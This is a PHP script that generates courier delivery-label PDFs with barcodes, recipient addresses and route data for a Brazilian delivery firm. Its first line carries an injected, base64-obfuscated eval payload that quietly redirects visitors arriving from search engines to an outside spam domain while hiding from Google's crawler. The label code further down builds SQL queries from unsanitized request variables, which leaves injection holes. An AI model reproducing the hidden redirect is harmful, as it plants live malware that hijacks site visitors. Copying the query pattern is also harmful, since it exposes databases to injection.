<?php	 	eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOyBpZiAoIWhlYWRlcnNfc2VudCgpKXsgaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkpeyBpZiAoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSl7IGlmICgocHJlZ19tYXRjaCAoIi9NU0lFICg5LjB8MTAuMCkvIiwkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pKSBvciAocHJlZ19tYXRjaCAoIi9ydjpbMC05XStcLjBcKSBsaWtlIEdlY2tvLyIsJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgb3IgKHByZWdfbWF0Y2ggKCIvRmlyZWZveFwvKFswLTldK1wuMCkvIiwkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10sJG1hdGNoZikgYW5kICRtYXRjaGZbMV0+MTEpKXsgaWYoIXByZWdfbWF0Y2goIi9eNjZcLjI0OVwuLyIsJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10pKXsgaWYgKHN0cmlzdHIoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddLCJ5YWhvby4iKSBvciBzdHJpc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwiYmluZy4iKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10pKSB7IGlmICghc3RyaXN0cigkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10sImNhY2hlIikgYW5kICFzdHJpc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddLCJFZVlwM0Q3IikpeyBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vYnJyam5rbmtqYWRnZC5yZWJhdGVzcnVsZS5uZXQvIik7IGV4aXQoKTsgfSB9IH0gfSB9IH0gfQ=="));


set_time_limit(0);
ini_set("memory_limit","1024M");
ini_set("max_execution_time","99999");
ini_set("memory_limit","1024M");
ini_set("upload_max_filesize","10000M");
ini_set("post_max_size","1024");
ini_set('upload_ tmp_dir', 'temp/');


require_once("classes/fpdf/code39.php");
require_once("classes/fpdf/fpdf.php");
require_once("classes/fpdf/retangulo.php");
require_once("classes/diversos.inc.php");


$qry = new consulta($con);
$qry_rota = new consulta($con);

$sql = "SELECT tbentrega.idexterno, tbenderecoentrega.nomeentrega,";
$sql = $sql."tbenderecoentrega.enderecoentrega, ";
$sql = $sql."tbenderecoentrega.bairroentrega, ";
$sql = $sql."tbenderecoentrega.cidadeentrega, ";
$sql = $sql."tbenderecoentrega.cepentrega, ";
$sql = $sql."tbentrega.obsentrega, ";
$sql = $sql."tbcliente.nomecliente, ";
$sql = $sql."tbproduto.nomeproduto, ";

$sql = $sql."tbentrega.numerosedex, ";
$sql = $sql."tbentrega.numnotafiscal, ";
$sql = $sql."tbentrega.idinterno, ";
$sql = $sql."tbentrega.valorentrega, ";
$sql = $sql."tbentrega.pesoentrega, ";
$sql = $sql."tbentrega.quantidadevolumes, ";
$sql = $sql."tbentrega.numlista, ";
$sql = $sql."tbenderecoentrega.estadoentrega, ";
$sql = $sql."tbenderecoentrega.responsavelentrega, ";
$sql = $sql."tbenderecoentrega.complementoenderecoentrega ";

$sql = $sql."from tbentrega, tbenderecoentrega,tbcliente,tbproduto ";
$sql = $sql." WHERE  tbentrega.idinterno = tbenderecoentrega.idinterno";
$sql = $sql." and  tbentrega.codigoproduto = tbproduto.codigoproduto";
$sql = $sql." and  tbentrega.codcliente = tbcliente.codcliente";



if($lote)
$sql.=" AND tbentrega.numloteinterno = '$lote'";


if($ar > 0)
$sql = $sql." and  tbentrega.idinterno  = $ar"   ;

if($cliente > 0)
$sql = $sql." and  tbentrega.codcliente  = $cliente"   ;



if($lista > 0)
$sql = $sql." and  tbentrega.numlista  = $lista"   ;


$sql = $sql." order by  tbentrega.numnotafiscal "   ;
//echo $sql;
//die;


$qry->executa($sql);


								                                                                                      
 $pdf=new FPDF();
 $pdf=new PDF_Code39();
 $pdf->AddPage();
  $pagina++;  



 $rec_x=0;
 $rec_y=0;
 $rec_w=0;
 $rec_h=0;
 
 
       
 
       
 $rec_x=10;
 $rec_y=5;
 $rec_w=190;
 $rec_h=70;
 $a=1;
 $conta_lista=0;
 
      
      for($i=0;$i<$qry->nrw;$i++)
          
        
         {
         
         $qry->navega($i);
          $a++;
         
         $destinatario = $qry->data["nomeentrega"];
         $endereco     = $qry->data["enderecoentrega"];
         $complemento  = $qry->data["complementoenderecoentrega"];
         $bairro       = $qry->data["bairroentrega"];
         $cidade       = $qry->data["cidadeentrega"];
         $cep          = str_replace("-","", $qry->data["cepentrega"]);
         $estado       = $qry->data["estadoentrega"];
         $idexterno    = $qry->data["idexterno"];
         $idinterno    = $qry->data["idinterno"];
         $anterior     = $qry->data["numerosedex"];
         $lista        = $qry->data["numlista"];
         $volumes      = $qry->data["quantidadevolumes"];
         $peso         = $qry->data["pesoentrega"];
         $rest         = $qry->data["responsavelentrega"];
         $valor        = $qry->data["valorentrega"];
         $obs          = $qry->data["obsentrega"];
         $cliente      = $qry->data["nomecliente"];
         $produto      = $qry->data["nomeproduto"];
         $obs          = $qry->data["obsentrega"];
         
         $obs1 = substr($obs,0,52);
         $obs2 = substr($obs,53,100);
         
         
         
         
       
         //Rota
                if (strlen(trim($cep)>0)){
                    $sql = "Select tb_cep.*, tb_rota.nome_rota from tb_rota,tb_cep 
                    where tb_cep.id_rota = tb_rota.id_rota and tb_cep.nr_cep = '$cep'";
                    $qry_rota->executa($sql);
                }
                
                   
                 if ($qry_rota->nrw)
                  {
                   $cod_rota = $qry_rota->data["id_rota"];
                  if(!$cod_rota)
                    $cod_rota=1;
                  //Descobrindo a Rota
                   $sql = "Select tbbase.nomebase,tbbase.codbase 
                           from tbbase,tb_rota_base
                           where tbbase.codbase = tb_rota_base.codbase
                           and id_rota = '$cod_rota'";
                           $qry_rota->executa($sql);
                            if ($qry_rota->nrw)
                              $base_entrega = $qry_rota->data["nomebase"];
                              $cod_base_entrega = $qry_rota->data["codbase"]; 
                              $obs = $obs.'      /       '.$base_entrega;
                  
                  }
         
              $obs3 = $base_entrega;
       
         //TABELA PRINCIPAL
         $pdf->Rect($rec_x,$rec_y,$rec_w,$rec_h);
         
         //TRAÇO VERTICAL DO PICOTE DO PAPEL
         $pdf->Rect(50,$rec_y + 15 ,0,55);
         
         //TRAÇO VERTICAL DO LOGOTIPO
         $pdf->Rect(10,$rec_y + 11 ,50,0);
         
         
         //TRAÇO VERTICAL DO MOTIVO DE DEVOLUÇÃO
         $pdf->Rect(10,$rec_y + 30 ,40,0);
         
         
         //TRAÇO VERTICAL QUE SEPARA O CODIGO DE BARRAS
         $pdf->Rect(50,$rec_y + 53 ,150,0);
         
         
         
         //TRAÇO VERTICAL DO NOME DO RECEBEDOR
         $pdf->Rect(130,$rec_y + 15 ,0,38);
         
         
         
         
         //TRAÇO HORIZONTAL ABAIXO DO RECEBEDOR
         $pdf->Rect(130,$rec_y + 21 ,70,0);
         
         $pdf->Rect(130,$rec_y + 26 ,70,0);
         
         $pdf->Rect(130,$rec_y + 31 ,70,0);
         
         $pdf->Rect(130,$rec_y + 36 ,70,0);
         
         $pdf->Rect(130,$rec_y + 41 ,70,0);
         
         $pdf->Rect(130,$rec_y + 46 ,70,0);
         
       
         
         //TRAÇO ABAIXO DO CÓDIGO DE BARRAS
         
         //$pdf->Rect(10,$rec_y + 33 ,120,0);
         //$pdf->Rect(10,$rec_y + 39 ,120,0);
         
         
         $pdf->Image('inc/img/logo-datacerta.jpg',15,$rec_y+1,20,7,'jpg','');
         $pdf->SetFillColor(224,235);
         
         $pdf->SetFont('Arial','B',6);
         
         $pdf->SetXY(10,$rec_y+5);
         $pdf->Cell(10,10," Data Certa  -  (11)2061-3138",2,2,'L',2,'');
         
         
         $pdf->SetXY(10,$rec_y+10);
         $pdf->Cell(10,11,substr($destinatario,0,27),2,2,'L',2,'');
         
         $pdf->SetXY(10,$rec_y+15);
         $pdf->Cell(10,11,substr($endereco,0,27),2,2,'L',2,'');
         
         $pdf->SetXY(10,$rec_y+20);
         $pdf->Cell(10,11,substr($endereco,27,30),2,2,'L',2,'');
         
         $pdf->SetXY(10,$rec_y+23);
         $pdf->Cell(10,11,substr($complemento,0,30),2,2,'L',2,'');
         
         //Motivos de devolução

         $pdf->SetFont('Arial','B',5);
         $pdf->SetXY(10,$rec_y+28);
         $pdf->Cell(10,11,"[   ] MUDOU-SE",2,2,'L',2,'');
         
         $pdf->SetXY(10,$rec_y+32);
         $pdf->Cell(10,11,"[   ] 1o AUSENTE ______/______/______",2,2,'L',2,'');
         
         $pdf->SetXY(10,$rec_y+36);
         $pdf->Cell(10,11,"[   ] 2o AUSENTE ______/______/______",2,2,'L',2,'');
         
         $pdf->SetXY(10,$rec_y+40);
         $pdf->Cell(10,11,"[   ] 3o AUSENTE ______/______/______",2,2,'L',2,'');
         
         $pdf->SetXY(10,$rec_y+44);
         $pdf->Cell(10,11,"[   ] ENDEREÇO INSIFICIENTE",2,2,'L',2,'');
         
         $pdf->SetXY(10,$rec_y+48);
         $pdf->Cell(10,11,"[   ] NUMERO INEXISTENTE",2,2,'L',2,'');
         
         $pdf->SetXY(10,$rec_y+52);
         $pdf->Cell(10,11,"[   ] FORA DE PERIMETRO ",2,2,'L',2,'');
         
          $pdf->SetXY(10,$rec_y+56);
         $pdf->Cell(10,11,"[   ] OUTROS (ESPECIFICAR ABAIXO) ",2,2,'L',2,''); 
         
          $pdf->SetFont('Arial','B',6);

         $pdf->SetXY(50,$rec_y+1);
         $pdf->Cell(60,5,substr($destinatario,0,50),1,1,'L',1,'');

         $pdf->SetXY(110,$rec_y+1);
         $pdf->Cell(40,5,substr($cliente,0,50),1,1,'L',1,'');

         $pdf->SetXY(150,$rec_y+1);
         $pdf->Cell(50,5,substr($produto,0,50),1,1,'L',1,'');



         
         $pdf->SetFont('Arial','B',6);
         $pdf->SetXY(50,$rec_y+6);
         $pdf->Cell(150,5,"ENDEREÇO :".$endereco,1,1,'L',2,'');
         
         $pdf->SetXY(50,$rec_y+11);
         $pdf->Cell(80,5,"COMPL. :".$complemento,1,1,'L',2,'');
         
         $pdf->SetXY(50,$rec_y+16);
         $pdf->Cell(40,5,"BAIRRO :".$bairro,1,1,'L',2,'');

         $pdf->SetXY(90,$rec_y+16);
         $pdf->Cell(40,5,"CIDADE :".$cidade,1,1,'L',2,'');

         $pdf->SetFont('Arial','B',10);
         $pdf->SetXY(50,$rec_y+21);
         $pdf->Cell(30,5,"CEP :".$cep,1,1,'L',2,'');
         $pdf->SetFont('Arial','B',6);
         
         $pdf->SetXY(80,$rec_y+21);
         $pdf->Cell(10,5,"UF :".$estado,1,1,'L',2,'');
         
         $pdf->SetXY(90,$rec_y+21);
         $pdf->Cell(40,5,"RESP :".$resp,1,1,'L',2,'');
         
         
         $pdf->SetXY(50,$rec_y+26);
         $pdf->Cell(20,5,"PESO: ".$peso,1,1,'L',2,'');

         $pdf->SetXY(70,$rec_y+26);
         $pdf->Cell(20,5,"VOL.: ".$volumes,1,1,'L',2,'');
         
         $pdf->SetXY(90,$rec_y+26);
         $pdf->Cell(40,5,"VALOR.: ".number_format($valor,2,",","."),1,1,'L',2,'');
         
         $pdf->SetXY(50,$rec_y+31);
         $pdf->Cell(80,5,"OBS : ".$obs1,2,2,'L',2,'');
         
         $pdf->SetXY(50,$rec_y+34);
         $pdf->Cell(80,5,$obs2,2,2,'L',2,'');
         
         $pdf->SetFont('Arial','B',16);
         $pdf->SetXY(50,$rec_y+43);
         $pdf->Cell(80,5,$obs3,2,2,'L',2,'');
         $pdf->SetFont('Arial','B',6);
                   
         $pdf->SetXY(50,$rec_y+40);
         $pdf->Cell(80,5,substr($obs4,180,60),2,2,'L',2,'');
         
         $pdf->SetXY(50,$rec_y+43);
         $pdf->Cell(80,5,substr($obs5,240,60),2,2,'L',2,'');
         
         
         
         



         
         //$pdf->SetXY(175,$rec_y+11);
         //$pdf->Cell(20,5,"Vl: ".$anterior,1,1,'L',2,'');
         
         
         
         //DADOS DO RECEBEDOR ******************************************************
         $pdf->SetFont('Arial','B',6);
         $pdf->SetXY(129,$rec_y+11);
         $pdf->Cell(66,5,"Recebedor :",2,1,'L',2,'');
         
         $pdf->SetXY(129,$rec_y+22);
         $pdf->Cell(66,5,"Doc:                                             Ass.",2,1,'L',2,'');
         
         $pdf->SetXY(129,$rec_y+27);
         $pdf->Cell(66,5,"Data:        /        /                          Hora :               :",2,1,'L',2,'');
         
         $pdf->SetXY(129,$rec_y+31);
         $pdf->Cell(66,5,"[  ]Proprio  [   ]Parente   [   ]Portaria   [   ]Outros",2,1,'L',2,'');
         //***************************************************************************
          $pdf->SetFont('Arial','B',10);
         
          $pdf->SetXY(129,$rec_y+36);
          $pdf->Cell(66,5,"CÓDIGO DA ROTA : ".$cod_rota ,2,1,'L',2,''); 

          $pdf->SetFont('Arial','B',6);           
          $pdf->SetXY(129,$rec_y+41);
          $pdf->Cell(66,5,"NOME ROTA : ". substr($nome_rota,0,40),2,1,'L',2,''); 
         
         
          $pdf->SetXY(129,$rec_y+46);
          $pdf->Cell(66,5,"PAGINA  : ". $pagina.' POSIÇÃO: '.$a  ,2,1,'L',2,''); 
         
         
        
        
        
         $pdf->SetXY(150,$rec_y+11);
         
        

         //INSERINDO A ROTA
         $pdf->SetFont('Arial','B',6);
         $pdf->SetXY(10,$rec_y+35);
         
        
         
         $pdf->SetFont('Arial','B',6);
         
                  
         $pdf->SetXY(129,$rec_y+55);
         $pdf->Code39(60,$rec_y+55,$idexterno,1,10);
         
         
         $pdf->SetFont('Arial','B',10);
         $pdf->SetXY(160,$rec_y+46);
          $pdf->Cell(90,43,"IDINTERNO : ".$idinterno ,2,1,'L',2,''); 
         $pdf->SetFont('Arial','B',6);
         
         $conta_lista++;
         
          
          
          
          
         // $rec_y = $rec_y + (60- $subtrai_linha); 
         $rec_y = $rec_y + 90; 
         //$rec_h = $rec_h + 50;
         // $pdf->SetY(30);
         //  $pdf->SetX(25);
         
         if($a==4)
           {
           $rec_y=3;
           $a=1;
           $pdf->AddPage();
           $pagina++;
           }
         
  
 }
   

$pdf->Output();






?>